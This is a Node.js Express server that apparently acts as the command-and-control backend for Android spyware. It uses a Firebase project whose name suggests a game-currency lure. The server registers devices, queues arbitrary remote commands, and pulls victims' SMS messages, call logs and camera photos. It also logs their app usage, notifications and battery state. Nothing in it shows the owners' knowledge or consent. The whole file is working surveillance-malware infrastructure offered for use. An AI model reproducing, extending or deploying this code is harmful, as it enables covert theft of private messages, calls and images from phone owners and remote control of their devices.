const express = require('express');
const admin = require('firebase-admin');
const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Firebase Admin
const serviceAccount = require('./serviceAccountKey.json');
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com'
});

const db = admin.database();
app.use(express.json({ limit: '10mb' }));

// ================== Device Registration ==================
app.post('/api/register', async (req, res) => {
  const { deviceId, info } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });

  try {
    const deviceRef = db.ref(`onlineDevices/${deviceId}`);
    await deviceRef.set({
      info: info || {},
      lastSeen: admin.database.ServerValue.TIMESTAMP,
      online: true
    });
    res.json({ status: 'registered', deviceId });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get online devices
app.get('/api/devices', async (req, res) => {
  try {
    const snapshot = await db.ref('onlineDevices').once('value');
    const devices = [];
    const now = Date.now();
    snapshot.forEach(child => {
      const device = child.val();
      if (now - device.lastSeen < 60000) {
        devices.push({
          deviceId: child.key,
          info: device.info,
          lastSeen: device.lastSeen
        });
      } else {
        child.ref.update({ online: false });
      }
    });
    res.json(devices);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== Commands ==================
app.post('/api/command', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });

  try {
    const commandsRef = db.ref(`commands/${deviceId}`);
    const newCommandRef = await commandsRef.push({
      command,
      timestamp: admin.database.ServerValue.TIMESTAMP,
      status: 'pending'
    });
    res.json({ status: 'queued', deviceId, command, key: newCommandRef.key });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== SMS & Calls ==================
app.get('/api/sms/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/sms`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    const responseRef = db.ref(`responses/${deviceId}/sms`);
    const timeout = 10000;
    let responded = false;
    const listener = responseRef.on('value', (snapshot) => {
      if (!responded && snapshot.exists()) {
        const data = snapshot.val();
        if (data.requestId === requestId) {
          responded = true;
          clearTimeout(timer);
          responseRef.off('value', listener);
          responseRef.remove();
          res.json(data.smsList || []);
        }
      }
    });
    const timer = setTimeout(() => {
      if (!responded) {
        responded = true;
        responseRef.off('value', listener);
        res.status(408).json({ error: 'Timeout' });
      }
    }, timeout);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/calls/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/calls`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    const responseRef = db.ref(`responses/${deviceId}/calls`);
    const timeout = 10000;
    let responded = false;
    const listener = responseRef.on('value', (snapshot) => {
      if (!responded && snapshot.exists()) {
        const data = snapshot.val();
        if (data.requestId === requestId) {
          responded = true;
          clearTimeout(timer);
          responseRef.off('value', listener);
          responseRef.remove();
          res.json(data.callList || []);
        }
      }
    });
    const timer = setTimeout(() => {
      if (!responded) {
        responded = true;
        responseRef.off('value', listener);
        res.status(408).json({ error: 'Timeout' });
      }
    }, timeout);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== Camera Capture ==================
app.get('/api/photo/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/photo`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    const responseRef = db.ref(`responses/${deviceId}/photo`);
    const timeout = 15000;
    let responded = false;
    const listener = responseRef.on('value', (snapshot) => {
      if (!responded && snapshot.exists()) {
        const data = snapshot.val();
        if (data.requestId === requestId) {
          responded = true;
          clearTimeout(timer);
          responseRef.off('value', listener);
          responseRef.remove();
          res.json({ imageBase64: data.imageBase64, timestamp: data.timestamp });
        }
      }
    });
    const timer = setTimeout(() => {
      if (!responded) {
        responded = true;
        responseRef.off('value', listener);
        res.status(408).json({ error: 'Timeout' });
      }
    }, timeout);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== App Usage ==================
app.post('/api/usage', async (req, res) => {
  const { deviceId, packageName, appName, timestamp } = req.body;
  if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });
  try {
    const usageRef = db.ref(`usage/${deviceId}`).push();
    await usageRef.set({ packageName, appName, timestamp: timestamp || admin.database.ServerValue.TIMESTAMP });
    res.json({ status: 'logged' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/usage/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const limit = req.query.limit || 20;
  try {
    const snapshot = await db.ref(`usage/${deviceId}`).orderByKey().limitToLast(limit).once('value');
    const usage = [];
    snapshot.forEach(child => {
      usage.push({ id: child.key, ...child.val() });
    });
    res.json(usage.reverse());
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== Notifications (NEW) ==================
app.post('/api/notification', async (req, res) => {
  const { deviceId, packageName, title, text, timestamp } = req.body;
  if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });
  try {
    const notifRef = db.ref(`notifications/${deviceId}`).push();
    await notifRef.set({ packageName, title, text, timestamp: timestamp || admin.database.ServerValue.TIMESTAMP });
    res.json({ status: 'logged' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/notifications/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const limit = req.query.limit || 20;
  try {
    const snapshot = await db.ref(`notifications/${deviceId}`).orderByKey().limitToLast(limit).once('value');
    const notifs = [];
    snapshot.forEach(child => {
      notifs.push({ id: child.key, ...child.val() });
    });
    res.json(notifs.reverse());
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== Battery & Device Info (NEW) ==================
app.post('/api/battery', async (req, res) => {
  const { deviceId, level, charging, timestamp } = req.body;
  if (!deviceId || level == null) return res.status(400).json({ error: 'Missing data' });
  try {
    const batteryRef = db.ref(`battery/${deviceId}`).push();
    await batteryRef.set({ level, charging, timestamp: timestamp || admin.database.ServerValue.TIMESTAMP });
    res.json({ status: 'logged' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/battery/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  try {
    const snapshot = await db.ref(`battery/${deviceId}`).orderByKey().limitToLast(1).once('value');
    let latest = null;
    snapshot.forEach(child => {
      latest = { id: child.key, ...child.val() };
    });
    res.json(latest);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/', (req, res) => res.send('Firebase Server Running'));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));